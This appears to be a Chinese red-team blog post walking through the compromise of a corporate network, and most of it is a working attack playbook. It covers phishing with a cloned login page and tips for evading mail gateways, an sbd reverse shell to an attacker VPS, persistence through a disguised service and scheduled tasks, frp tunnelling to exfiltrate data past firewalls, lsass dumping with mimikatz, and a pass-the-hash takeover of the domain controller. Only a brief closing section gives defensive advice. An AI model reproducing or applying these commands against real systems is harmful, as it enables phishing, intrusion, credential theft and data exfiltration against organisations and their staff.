+<p>钓鱼邮件的内容其实也很有讲究，以往的什么系统补丁更新啊之类的老套路现如今已经没那么适用了，我们需要抓住他人的心理：不少人工作时都有过私自将内部资料转入转出的行为吧？假如你是一位程序员，或多或少你的 GitHub 会有你公司的代码吧？所以，邮件内容一定要紧紧地抓住目标的神经，让他忘记去判断邮件的真伪，要的是一上来就感到心慌的那种效果。</p>
+<p>此外，我们还需要搭建一个钓鱼网站用来接收目标键入的账号密码，理想的环境当然是完全仿真的钓鱼站点，但由于多方限制（主要是前端太渣。。）只好在 VPS 上魔改一个 dvwa 的登录口，无论对方输入正确或者错误的密码都将跳转到目标企业的 OA 系统。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/phish_web.png" alt="phish_web"></p>
+<p>还有，钓鱼网站的域名也需要正儿八经一点，实在不行写 IP 也比写一些弱智域名要好。。。要注意，在写钓鱼邮件时，域名或 IP 如果可以不写 <code>http://</code> 那就尽量不写，虽然仿真度稍逊，但是可以绕过邮件网关的检测，如果邮件网关一开始就直接把你钓鱼站点拉黑，那还搞毛线。。。</p>
+<p>理想状况下每次目标登录钓鱼网站时，都应将目标键入的帐密都存到数据库里，然后跳转至真实登录页面。然而为了赶时间，就用 setoolkit 的 <code>clone site</code> 模块克隆了魔改 dvwa 后的钓鱼登录页面，这样需要 setoolkit 持续监听，每当有人请求钓鱼站点时，setoolkit 都会有回显信息。</p>
+<p> <code>setoolkit 👉🏻 1) Social-Engineering Attacks 👉🏻 2) Website Attack Vectors 👉🏻 3) Credential Harvester Attack Method 👉🏻 2) Site Cloner</code> </p>
+<p>对于 setoolkit 其实也有很多小坑，比如需要安装最新版的 setoolkit，否则可能会无法正常运行；且最新版的 setoolkit 需要配置代理访问，否则 python 会报错（setoolkit 是用 python 写的）；另外 setoolkit 的更新也挺费事的。。贴个更新教程视频（需科学上网）： 🔗 <a href="https://youtu.be/DwpDihZzpQc" target="_blank" rel="noopener">https://youtu.be/DwpDihZzpQc</a></p>
+<p>搭建好钓鱼网站，针对特定目标发送钓鱼邮件，接下来只需要静静地等待就 OK。一开始我是没抱太大希望的，然而邮件发出后没等太久，就有鱼儿上钩了：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/victim1.png" alt="victim1"></p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/victim.png" alt="victim"></p>
+<p>成功拿到域账号和密码，邮件钓鱼不比爆破效率高多了？况且这还只是针对员工信息钓鱼，邮件附件免杀后门绕过邮件网关检测然后上线 CS 同样是一个切实可行的思路，但是在免杀方面还是得花点心思。我总觉得爆破这东西不靠谱，可能是我还没领悟到爆破的精髓吧。。。</p>
+<h2 id="🕹️-内网渗透"><a href="#🕹️-内网渗透" class="headerlink" title="🕹️ 内网渗透"></a>🕹️ 内网渗透</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>对企业进行内网渗透攻击，需要对该公司有诸多了解，比如员工的上下班时间、公司是否强制员工下班必须关电脑等等，这些可以通过求职招聘等方式去了解。如此一来我们在下班时间便有机可乘，可以无感知地登入员工电脑了。</p>
+<p>另外，还要注意观察企业员工所使用的机器，是台式机居多还是笔记本居多。如果是大公司、政企等，一般以台式机为主，这样就需要留心公司的会议室，会议室一般会有投影仪，还有配合投影仪的一台电脑（这种机器一般权限设置得比较死，只允许进行远程连接），通常会议时员工通过该电脑可以远程登录域账号来进行 PPT 演示，我们同样可以利用这一点，在临近下班的时候，进入公司的某一间会议室，拿着我们已经获取到的域账号和密码进行远程登录，这种方式比较隐蔽。但要注意 Windows10 之后只允许同时间内一个用户登入，所以一定要耐得住寂寞，不要打草惊蛇。</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>拿到账号密码之后，我们在临近下班的时间点，选择一间会议室，就可以开搞了。</p>
+<p>首先确定一波基本信息，是否是域环境、域名、有几个域控、主域控、域控名称、网段等等。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%884.57.01.jpg" alt="Screenshot 2020-09-07 下午4.57.01"></p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.05.44.jpg" alt="Screenshot 2020-09-07 下午5.05.44"></p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.09.03.jpg" alt="Screenshot 2020-09-07 下午5.09.03"></p>
+<p>其次我们要知道钓鱼获得的账号对应机器的 IP，我们可以先 <code>net user /domain</code> 看看当前网段具有哪些用户，在大公司的域环境中，对于员工的电脑名称设置一般是有要求的，摸索到名称规范之后，可以直接 <code>ping</code> 该用户名，就可以得到对应的 IP。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.02.18.jpg" alt="Screenshot 2020-09-07 下午5.02.18"></p>
+<p> <img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-07%20%E4%B8%8B%E5%8D%885.21.02.jpg" alt="Screenshot 2020-09-07 下午5.21.02"></p>
+<p>接着 <code>mstsc</code> 登入之后，发现是域用户和本地管理员的权限，这意味着我们可以做抓取本地 Hash、新建用户等等高权限操作。抓取 Hash 稍后再说，首先搞定权限维持的事儿。</p>
+<h4 id="放置后门"><a href="#放置后门" class="headerlink" title="放置后门"></a>放置后门</h4><p>大概看了下办公网机器部署了准入设备和某国产杀软，准备放置 beacon 上线 CS（需要免杀）或者简单弹个 cmd 到 VPS。首先尝试了一下 CS beacon，全部被阻断，做了一些免杀可以绕过 360，但是没法绕过 FireEye，FireEye 是基于流量检测，真蛋疼。</p>
+<p>接着尝试了下 nc 连接 VPS，居然没有拦截和阻断。这里要注意的是不要直接弹 Windows system32 目录下的 <code>cmd.exe</code> ，可能会引起杀软报警，可以先复制出来到其他目录，再用 nc 进行调用。</p>
+<p>另外，因为 nc 是明文流量传输，太容易被发现，这里建议大伙儿用 sbd，其英文名为 <code>secure backdoor</code>  ，顾名思义是后门版本的 nc，它的加密采用 AES-128-CBC + HMAC-SHA1，是 nc 的衍生版。直接在目标机器下载 sbd 可能会被拦截，所以最好还是压缩包加密后放在自己的 VPS 上进行下载。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// victim</span><br><span class="line">c:\&gt; sbd.exe 1.1.1.1 8877 -e .\cmd.exe -v -n</span><br><span class="line"></span><br><span class="line">// attacker VPS</span><br><span class="line">$ sbd -l -p 8877</span><br></pre></td></tr></table></figure>
+
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%882.40.25.jpg" alt="Screenshot 2020-08-14 下午2.40.25"></p>
+<p>来看下流量对比（测试），nc 直接是明文流量：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.31.12.jpg" alt="Screenshot 2020-09-08 上午10.31.12"></p>
+<p>而 sbd 是加密的流量：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8810.32.51.jpg" alt="Screenshot 2020-09-08 上午10.32.51"></p>
+<p>还是很奇怪为什么免杀后的 CS beacon 会被检测阻断而 sbd 的流量却没有被 FireEye 拦截，可能是因为 beacon 的特征被 FireEye 检测到，而 sbd 不在黑名单里？所以说，作为红队成员除了要搞明白原理，还是得多尝试和碰运气啊 😓</p>
+<p>拿到 shell 之后，就不必再费力气冒着被保安 gank 的风险跑会议室了。。可以回去慢慢搞了。。另外，持久化后门也得下点功夫，直接就从两个常规的思路入手：服务和计划任务。</p>
+<h4 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h4><p>创建服务这块现在也被杀软盯得蛮紧的。这里需要注意的是工作目录最好普通一点，不要太招摇。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 把 sbd 改为 register.exe 这种迷惑性名称，然后放在微信文件的目录下</span><br><span class="line">// 创建一个新服务</span><br><span class="line">c:\&gt; sc create &quot;wechat daemon&quot; binpath= &quot;c:\users\xxx\desktop\&quot;wechat files&quot;\register.exe&quot;</span><br><span class="line"></span><br><span class="line">// 将服务设置为自启动</span><br><span class="line">c:\&gt; sc config &quot;wechat daemon&quot; start= auto</span><br><span class="line"></span><br><span class="line">// 服务描述</span><br><span class="line">c:\&gt; sc description &quot;wechat daemon&quot; &quot;微信守护进程&quot;</span><br><span class="line"></span><br><span class="line">// 启动服务</span><br><span class="line">c:\&gt; net start &quot;wechat daemon&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><p>因为持有目标的账号和密码，所以用计划任务的方式来设置计划任务应该更隐蔽。计划任务的命令比较复杂，需要学习一番。</p>
+<p>首先可以写一个 bat 文件，调用 sbd 来连接 VPS，然后写入计划任务每天早上九点执行一次。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 每天早上 9 点执行 config.bat</span><br><span class="line">c:\&gt; schtasks /create /tn task1 /tr &quot;c:\xxx\config.bat&quot; /sc daily /st 09:00 /F</span><br></pre></td></tr></table></figure>
+
+<p>后期在横向移动时，还会用到域内的计划任务设置，需要目标账户的密码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 19:25 执行一次</span><br><span class="line">c:\&gt; schtasks.exe /create /s \\PC-Name /u &quot;USERNAME&quot; /p &quot;PASSWORD&quot; /ru &quot;SYSTEM&quot; /tn task1 /sc ONCE /st 19:25 /tr G:\\fuck_intra.bat /F</span><br></pre></td></tr></table></figure>
+
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/schtasks.png" alt="schtasks"></p>
+<p>OK，这样一来，每天早上会弹回一个 shell，算是完成了后门持久化。</p>
+<h3 id="内网通信隧道"><a href="#内网通信隧道" class="headerlink" title="内网通信隧道"></a>内网通信隧道</h3><p>成功连接后门之后，为了能在外部更加方便地进行域渗透，还需要建立一些内网的通信隧道，首先从内网的端口转发开始，把内网机器的 3389 端口转发出来。</p>
+<h4 id="内网端口转发和映射"><a href="#内网端口转发和映射" class="headerlink" title="内网端口转发和映射"></a>内网端口转发和映射</h4><p>端口转发的工具实在太多了：rinetd、lcx、ew、venom、netsh 之类，各有优缺点吧，值得好好研究一番。这一部分我主要用 frp + lcx 直接把内网的 3389 映射到 VPS 再转发到本地，因为有防火墙会实时检测和阻断，所以要在 frpc 的配置文件头部设置 tls 加密，这样一来就可以绕过防火墙的检测了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// frpc 配置文件</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">server_addr = 1.1.1.1  #VPS IP</span><br><span class="line">server_port = 6768  #VPS 端口</span><br><span class="line">tls_enable = true  #设置 tls 加密</span><br><span class="line"></span><br><span class="line">[https]</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 3389</span><br><span class="line">remote_port = 2333  #将本地 3389 端口映射至公网的 2333</span><br></pre></td></tr></table></figure>
+
+<p>另外，lcx 也是老生常谈的端口转发的工具，就不过多赘述了，结合 frp 后的效果还算不错：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.33.36.jpg" alt="Screenshot 2020-08-14 下午3.33.36"></p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-08-14%20%E4%B8%8B%E5%8D%883.34.38.jpg" alt="Screenshot 2020-08-14 下午3.34.38"></p>
+<p>额。。突然反应过来，我直接连 VPS 的端口不就好了，干嘛还要用 lcx 映射到本地来呢。。。。。。</p>
+<h4 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h4><p>为什么要将内网代理出来呢，因为有些服务只提供给内网员工使用，比如 OA 系统、堡垒机系统、企业 wiki 等等，这些从外网是访问不到的。</p>
+<p>如果是 CS 或 msf 的后门，则可以很方便地用 SOCKS 搭配 proxifier 搭建隧道，然而 beacon 被 FireEye 杀得七零八落，很惨，只好想想别的思路：这个时候 SSR 就凸显出它的优势来了。</p>
+<p>SSR 项目的目的就在于突破网络封锁，通过 SSR Server 来访问「内网」不可访问的站点。这里我们已经控制了一台域内机器，但是它处于内网不可直接访问，这里我们可以用反向代理的思路，以这台机器作为 SSR Server，然后把它监听的端口映射至 VPS，然后通过 VPS 访问内网的服务。</p>
+<p>（其实 VPN 也不乏为一种思路，只是 VPN 动静太大且流量特征过于明显。）</p>
+<p>ShadowSocks 有很多种版本，由于得到的跳板机是 Windows，所以我们选择轻量的 libQtShadowsocks。</p>
+<p>项目地址：🔗 <a href="https://github.com/shadowsocks/libQtShadowsocks/releases" target="_blank" rel="noopener">https://github.com/shadowsocks/libQtShadowsocks/releases</a></p>
+<p>首先新建配置文件 <code>config.json</code> ：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;server&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;server_port&quot;:8388,</span><br><span class="line">    &quot;local_address&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;local_port&quot;:1080,</span><br><span class="line">    &quot;password&quot;:&quot;123456&quot;,</span><br><span class="line">    &quot;timeout&quot;:300,</span><br><span class="line">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</span><br><span class="line">    &quot;fast_open&quot;:false,</span><br><span class="line">    &quot;workers&quot;: 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将配置文件和解压下载得到的 <code>shadowsocks-libqss.exe</code> 放在同一目录下，然后命令行执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// -S 表示以 server 模式运行</span><br><span class="line">c:\&gt; .\shadowsocks-libqss.exe -c config.json -S</span><br></pre></td></tr></table></figure>
+
+<p>此时 SSR 服务端将在本地的 <code>8388</code> 端口开始监听，然后按之前的方法将 <code>8388</code> 端口映射至 VPS 的 <code>12345</code> 端口，然后 attacker 本地的 SSR 客户端如下设置：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.28.49.jpg" alt="Screenshot 2020-09-08 下午3.28.49"></p>
+<p>然后将浏览器代理设置为本地的 ssr 客户端代理端口即可，Windows 默认为 <code>1080</code> ，macOS 默认为 <code>1086</code> ，然后即可访问到内网服务，burp 同样将上游代理设置为 SSR 的代理端口即可。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8B%E5%8D%883.10.28.jpg" alt="Screenshot 2020-09-08 下午3.10.28"></p>
+<p>然后就可以愉快地测试内网 web 服务的漏洞啦，好吧不经意间又加大了工作量。。。</p>
+<h4 id="数据传入和传出"><a href="#数据传入和传出" class="headerlink" title="数据传入和传出"></a>数据传入和传出</h4><p>敏感文件传出同样可以采用端口映射的思路：首先在本地建立一个文件夹，在该文件夹内用 python 启动一个 https 服务（用来绕过防火墙检测），然后将 https 监听的端口映射至公网即可。</p>
+<p>python-https 脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> BaseHTTPServer, SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"></span><br><span class="line">httpd = BaseHTTPServer.HTTPServer((<span class="string">'localhost'</span>, <span class="number">4443</span>), SimpleHTTPServer.SimpleHTTPRequestHandler)</span><br><span class="line">httpd.socket = ssl.wrap_socket (httpd.socket, certfile=<span class="string">'/Users/nickyan/Desktop/Workstation/python</span></span><br><span class="line"><span class="string">_https/server.pem'</span>, server_side=<span class="literal">True</span>)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>其中生成证书的部分要注意：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 生成 RSA 密钥</span><br><span class="line">$ openssl genrsa -des3 -out server.key 1024</span><br><span class="line"></span><br><span class="line">// 去除掉密钥文件保护密码</span><br><span class="line">$ openssl rsa -in server.key -out server.key</span><br><span class="line"></span><br><span class="line">// 生成ca对应的csr文件</span><br><span class="line">$ openssl req -new -key server.key -out server.csr</span><br><span class="line"></span><br><span class="line">// 自签名</span><br><span class="line">$ openssl x509 -req -days 1024 -in server.csr -signkey server.key -out server.crt</span><br><span class="line">$ cat server.crt server.key &gt; server.pem</span><br><span class="line"></span><br><span class="line">启动服务时在对应目录运行脚本即可</span><br></pre></td></tr></table></figure>
+
+<p>再骚一点的思路就是放个 webshell 上去，然后把本地起的 web 端口映射出来然后连接，不过略折腾，不搞了。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.32.13.jpg" alt="Screenshot 2020-09-08 上午11.32.13"></p>
+<p>数据传入同样可以利用这种方式，用以传入恶意工具，但是问题在于目标机器下载的链接会直接暴露 VPS IP，如果目标内网有杀软持续检测，检测到恶意文件的链接地址可能会直接封禁，干。</p>
+<h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>其实整个内网渗透过程的关键就在于信息收集工作做得怎么样，很多时候不经意间收集到了一些关键的信息，或许就能四两拨千斤，一举拿下域控，所以在内网渗透时一定要注意细节。</p>
+<p>目标是拿下域控，有这么几种思路：探测内网存在的服务，看是否存在有漏洞的系统，比如 OA 等等；漏洞批量扫描，看是否能 RCE；利用之前钓鱼获得的帐密进行横向移动。最终的目的都是导出 Hash，看是否存在敏感用户或高权限账户的 Hash，然后再如此往复一步步深入。</p>
+<h4 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a>内网扫描</h4><p>进入内网后首先来一波内网扫描，看看自己所处的网段以及同网段的用户等等，探测存活主机直接用 <code>nbtscan</code> 即可：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/intra_scan.png" alt="intra_scan"></p>
+<p>K8gege 出品的 ladon 也非常好用，姿势很多。</p>
+<h4 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h4><p>其实刚进入域的时候通过 <code>nltest</code> 命令就已经获取到了域控的位置，定位域控其实有很多种方式：内网扫描开放 <code>389</code> 、 <code>636</code> 之类域控特定端口的主机； <code>net time</code> 命令定位域控；域内 dns 查询定位域控等等。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 列出域内存在的域控，其中 pdc 为主域控</span><br><span class="line">c:\&gt; nltest /dclist:xxx</span><br><span class="line"></span><br><span class="line">// 查询域控</span><br><span class="line">c:\&gt; nltest /dsgetdc:xxx</span><br><span class="line"></span><br><span class="line">// 获取 pdc 名称</span><br><span class="line">c:\&gt; nltest /dcname:xxx</span><br><span class="line"></span><br><span class="line">// 同步域内时间，时间服务器通常是域控</span><br><span class="line">c:\&gt; net time /domain</span><br><span class="line"></span><br><span class="line">// dns 查询，域内 DNS 服务器可能是域控</span><br><span class="line">c:\&gt; nslookup xxx.xxx.com</span><br><span class="line"></span><br><span class="line">// 查询域内域控的机器名称</span><br><span class="line">c:\&gt; net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p>掌握好 Windows 的命令真的很重要啊，而且必须是信手拈来，关键时刻查手册可不行。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-09%20%E4%B8%8A%E5%8D%8810.48.38.jpg" alt="Screenshot 2020-09-09 上午10.48.38"></p>
+<h4 id="批量-POC-扫描"><a href="#批量-POC-扫描" class="headerlink" title="批量 POC 扫描"></a>批量 POC 扫描</h4><p>因为内网布置了某国内杀软，可以在域内批量打补丁，因此 <code>MS17-010</code> 之类的 RCE 没有检测到，倒是发现了 <code>CVE-2020-0796</code> 的踪迹，然而目前只有蓝屏的 POC，没法 RCE，哭惹。</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/CVE-2020-0796.png" alt="CVE-2020-0796"></p>
+<p>K8gege 的 ladon 实在太方便了，速度也很快，目前已成为我域内渗透必上工具之一了。</p>
+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>换个思路，从横向移动开始搞吧，收集一波 Hash 再说。思路是通过已掌握的跳板机 IPC 连接其他机器 👉🏻 写入后门 👉🏻 计划任务定时执行 👉🏻 然后抓取 Hash。</p>
+<p>IPC 在内网真的太好用，然而要注意 server 12 之后的版本对外是默认关闭 smb 共享的（所以 MS17-010 失败），但是在域内因为需要文件传输，所以 <code>139</code> 、 <code>445</code> 都是开着的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 与远程主机 IPC 连接</span><br><span class="line">c:\&gt; net use \\PC-name\c$ /user:&quot;username&quot; &quot;PASSWORD&quot;</span><br><span class="line"></span><br><span class="line">// 查看已建立的连接</span><br><span class="line">c:\&gt; net use</span><br><span class="line"></span><br><span class="line">// 删除 IPC 连接</span><br><span class="line">c:\&gt; net use \\PC-name /del</span><br><span class="line"></span><br><span class="line">// 文件传输</span><br><span class="line">c:\&gt; copy .\a.bat \\PC-name\c$\</span><br></pre></td></tr></table></figure>
+
+<p>后门 和 mimikatz 都可用这个方式传输，不过杀软对于 mimikatz 居然没有报警，还是蛮惊讶的，但是为了隐蔽起见，还是采用 ProDump + mimikatz 离线导出 Hash 的方式吧。</p>
+<h4 id="离线导出-Hash"><a href="#离线导出-Hash" class="headerlink" title="离线导出 Hash"></a>离线导出 Hash</h4><p>ProcDump 是微软官方的进程信息抓取工具，具有 Microsoft 签名，所以杀软不会拦截。下载解压后选择对应目标系统的 32 位或 64 位版本，将 ProDump 用 IPC 传输至目标主机，然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// 导出 lsass.exe 的进程内存信息，保存为 lsass.dmp</span><br><span class="line">c:\&gt; procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>然后将 <code>lsass.dmp</code> 再利用 IPC 传回来，利用 mimikatz 导出 Hash：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>要注意对于 Server 2012 及以上，或者打了补丁的操作系统，无法直接读取明文，必须修改注册表，重启服务器等待管理员登录才能获取到明文密码。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\ /v UseLogonCredential /t REG_DWORD /d 1</span><br></pre></td></tr></table></figure>
+
+<p>不过这动静太大了，获取到 Hash 足矣。还有很多种抓取 Hash 的方式：mimikatz + PowerShell；msf；CS；读取 SAM 等等等等，具体情况需要具体分析。</p>
+<h4 id="意外发现"><a href="#意外发现" class="headerlink" title="意外发现"></a>意外发现</h4><p>一番 Hash 抓取之后，有意外的发现。在某台主机中抓取到了除本机域用户之外，其他用户的 Hash：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/hashes.png" alt="hashes"></p>
+<p>不清楚该用户是什么身份和权限， <code>net user</code> 查看下：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/Screenshot%202020-09-08%20%E4%B8%8A%E5%8D%8811.36.37.jpg" alt="Screenshot 2020-09-08 上午11.36.37"></p>
+<p>该用户是域管权限，也就是说内部员工曾经以域管账号登录过这台主机，且一直没有重启过。</p>
+<p>功夫不负有心人啊，感觉域控已经在前方招手了。。。</p>
+<h3 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h3><p>已经拿到了域管的 Hash，也已经定位了域内的几台域控，接下来一波 Pass The Hash 攻击应该就可以直接结束战斗了。</p>
+<h4 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h4><p>psexec 走一波：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c:\&gt; python2 .\psexec.py username@IP -hashes LMHASH:NTHASH</span><br></pre></td></tr></table></figure>
+
+<p>不出所料，弹回 session：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/psexec.png" alt="psexec"></p>
+<p>拿下了域控，成功创建了一个新用户并加入了域管理员组，至此内网渗透算是结束。</p>
+<p>其实域内攻击还有很多其他的思路：Kerberosting、CVE-2018-8581 Exchange SSRF、CVE-2020-0688 Exchange RCE 等等，有时候拿到一台主机的权限后，一定要多注意一下这个用户本身的权限、桌面的文件等等，因为很多员工会直接把内网的很多密码直接保存在桌面的某个文件中。</p>
+<p>其次还有 SPN 信息收集、委派、中继、金银票据传递等等，域渗透的知识面实在太广泛了。</p>
+<p>很多企业往往在 Web 方面层层把守，然而内网却千疮百孔，甚至攻击者在内网翻来覆去都没有监控报警。</p>
+<h2 id="总结复盘"><a href="#总结复盘" class="headerlink" title="总结复盘"></a>总结复盘</h2><h3 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h3><p>整个内网渗透下来，形成了一条完整的攻击链：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">邮件钓鱼 - 内网扫描 - 横向移动 - 抓取 Hash - 拿下域控</span><br></pre></td></tr></table></figure>
+
+<p>邮件安全确实是一个很令企业头疼的问题，从这么一个小小的切入点，最后能拿到域控，邮件安全的重要性不言而喻，因此，邮件网关的策略部署、定期自查，员工的邮件安全意识培训，都非常重要。</p>
+<p>其次，域内用户的权限过高也会带来安全风险，这次案例中域内用户均是本地管理员组权限，具有「调试程序」权限（默认管理员组具有），可以直接从内存中抓取进程信息，导致攻击者可以获得 Hash，进而进行 PTH 攻击。</p>
+<p>建议禁止域内用户的「调试程序」权限，并设置为仅管理员具有该权限，而不是管理员组；另外杀软也应该针对 mimikatz 或其他可调试内存的程序及时告警和阻断。</p>
+<p>另外，一定要规范域管的权限，防止域管随意登录域内的机器。</p>
+<h3 id="关于-PTH-攻击的原理及技术细节问题"><a href="#关于-PTH-攻击的原理及技术细节问题" class="headerlink" title="关于 PTH 攻击的原理及技术细节问题"></a>关于 PTH 攻击的原理及技术细节问题</h3><p>此次内网渗透的结尾是用 PTH 攻击获取到域控的权限的，是一种比较经典的攻击手法，想要完全防御 PTH 攻击，也令人很头疼。在实战测试时发现一些问题，如果你也对 PTH 抱有疑虑，希望这篇文章可以帮助到你。</p>
+<p>首先来说说 NTLM 协议。要完成 NTLM 认证，第一步客户端将自己要参与认证的用户名发送到服务端，等待服务端给出 challenge。其实哈希传递就是使用用户名对应的 NTLM Hash 将服务器给出的 Challenge 加密，生成一个 Response，来完成认证。</p>
+<p>Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程，所以不算是一个漏洞，算是一个技巧。</p>
+<p>我们知道，PTH 攻击是钻了 NTLM 协议的空子，我们也知道，在域环境内是基于 Kerberos 认证的，那么：</p>
+<ol>
+<li>在域内，既然是 Kerberos 认证，那么为什么基于 NTLM 协议的 PTH 攻击还能攻击成功呢？</li>
+<li>既然 PTH 攻击是基于 NTLM 协议的，那么在域内直接禁止所有 NTLM  流量，不就可以防止 PTH 攻击了吗？</li>
+<li>在抓取 Hash 的过程中，究竟抓到了哪些 Hash？psexec 的 -hashes 参数格式要求是 LMHASH:NTHASH，然而在此次实战中利用的是 SHA1 HASH:NTHASH，为什么可以成功弹回 session 呢？</li>
+</ol>
+<p><strong>在域环境中，Kerberos 和 NTLM 协议其实是共同使用的。</strong>域环境下的 NTLM 协议的核心内容和工作组并无太大差别，只是最后 Server 需要将认证信息使用 netlogon 协议发送给 DC，由 DC 来完成检验并返回认证结果。（参见 🔗 <em><a href="http://blog.sycsec.com/2018/10/02/What-is-Pass-the-Hash-and-the-Limitations-of-mitigation-methods/#%E5%9F%9F%E7%8E%AF%E5%A2%83" target="_blank" rel="noopener">http://blog.sycsec.com/2018/10/02/What-is-Pass-the-Hash-and-the-Limitations-of-mitigation-methods/#%E5%9F%9F%E7%8E%AF%E5%A2%83</a></em>）</p>
+<p><strong>域内禁止 NTLM 协议，就能解决 PTH 攻击，这个结论是正确的，但是有些服务只支持 NTLM 认证，所以为了兼容性，大多数域内还是选择不禁止。不禁止的话，域内就会同时支持 NTLM 和 Kerberos，根据客户端的协商选择用哪个协议进行认证。</strong></p>
+<p>最后，出于安全考虑，在 Windows Vista 及 Windows Server 08 之后便不再存储 LM HASH，只保存 NTLM Hash 和 SHA1 Hash，所以 LM Hash 变得不再有价值。而一些工具需要填写固定格式 LMHASH:NTLMHASH（例如 psexec），这里可以用任意值代替。</p>
+<blockquote>
+<p>In the event that the user’s password is longer than 15 characters, the host or domain controller will not store the LM hash for the user; the LM response cannot be used to authenticate the user in this case. A response is still generated and placed in the LM Response field, using a 16-byte null value (0x00000000000000000000000000000000) as the LM hash in the calculation. This value is ignored by the target.</p>
+<ul>
+<li><a href="http://davenport.sourceforge.net/ntlm.html" target="_blank" rel="noopener">http://davenport.sourceforge.net/ntlm.html</a></li>
+</ul>
+</blockquote>
+<p>可以发现任意值代替也可以成功弹回 session（测试）：</p>
+<p><img src="//naykcin.top/2020/09/05/intra-fuck/lm.jpg" alt="lm"></p>
